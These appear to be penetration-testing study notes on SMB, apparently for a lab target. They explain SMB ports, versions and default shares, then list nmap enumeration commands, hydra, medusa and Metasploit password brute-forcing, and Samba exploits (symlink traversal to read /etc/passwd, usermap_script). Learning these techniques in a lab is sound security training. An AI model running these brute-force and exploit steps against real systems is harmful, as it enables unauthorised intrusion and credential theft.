*SMB - SERVER MESSAGE BLOCK


- Client - Server communication protocol used for sharing access to files, printers, serial ports and other resources on a network

- Also known as RESPONSE-REQUEST PROTOCOL

SMB PROVIDES files and print services for all clients using SMB/CIFS protocol
Common Internet File System

# Port numbers
- uses 445 (older versions prev to windows 2000 used port 139)
- Port 139 is known as NBT over IP
- Port 445 is SMB over IP


- if you carefully observe all our windows missions will have this port 139 or 445 open 


# what is the purpose of those ports?

- in general whenever you see this port open these services will help those windows missions on doing file sharing, file transfers and all on this network 

- we actually set up network file share network file transfer right so those are all possible because of this netbios service running on those windows missions. 

- this netbios service is a default service on all your windows missions. and it is not default on linux missions on linux missions you need to set up and start the network service.



TECHNICAL TERMINOLOGIES OF SMB
-------------------------------
SMB CLIENT
SMB SERVER
SMB SHARE


VERSIONS OF SMB
---------------
SMB V1 - No encryption, (Wannacry, NotPetya)
SMB V2 - Windows vista and server 2008, Basic security enhancemenmts
SMB V3 - Windows 8 and server 2012
end to end SMB encryption


SMB PROTOCOL SECURITY
----------------------
- Share level Security
- User Level Security


SECURITY FLAW
----------------
- Windows exposes several administrativ and hidden share via SMB by default
- The common shares
C$  	Will allow access to the C drive on the remote m achine
Admin$ 	Allows access to windows installation directory
IPC$ 	its a special share within windows that is used to faciliate inter process communication




*ENUMERATION

1. Using NMAP
# nmap -p 445 -A 192.168.1.6

2. Using NMAP Scripts

- Uing SMB-OS-DISCOVERY
# nmap --script smb-os-discovery.nse -p 445 192.168.1.6

- USing SMB-ENUM-SHARES
# nmap --script smb-enum-shares.nse -p 445 192.168.1.6

- Using SMB-ENUM-USERS.nse
# nmap --script smb-enum-users.nse -p 445 192.168.1.6

- Using Protocol Discovery
# nmap -p 445 --script smb-protocols 192.168.1.6 -vv

# nmap -p 445 --script=smb-vuln-ms17-010 192.168.1.6
# nmap -p 445 --script=smb-vuln-cve-2017-7494 192.168.1.6


Exploit using different tools
---------------------------------
A. xHydra

# hydra -L user.txt -P pass.txt 192.168.1.6 smb
# hydra -L user.txt -P pass.txt smb://192.168.1.6:445 

B. Medusa
# medusa -h 192.168.1.6 -U user.txt -P pass.txt -M smbnt



C. MSF
# use axiliary/scanner/smb/smb_login
# set RHOSTS 192.168.1.6
# set user_file /root/user.txt
# set pass_file /root/pass.txt
# set stop_on_success true
# exploit






# SMBCLIENT

- Samba client with an FTP Liek interface
- Used to transfer files or to look into share names

1. To list the shares on the host machine
# smbclient -L 192.168.1.1
# smbclient -L \\\\192.168.1.1

2. If we have username and password
# smbclient -L \\\\192.168.1.1 -U 'msfadmin'


Exploiting using msfconsole
# use auxiliary/admin/smb/samba_symlink_traversal
# show options
# set RHOST 192.168.1.6
# set SMBSHARE tmp
# exploit

This will have a new file mounted and which has access to the root file system.

try to use this to connect server

smbclient //192.168.1.6/tmp

cd rootsf

ls

cd etc\

ls

get passwd

more passwd



second method
------------------------------------------------------

ls -al /usr/share/nmap/scripts/ | grep -e "smb"


searchsploit samba | grep 3.0. 20


search samba username map script

Exploiting using msfconsole
# use exploit/multi/samba/usermap_script
# show options
# set RHOST 192.168.1.6
# exploit






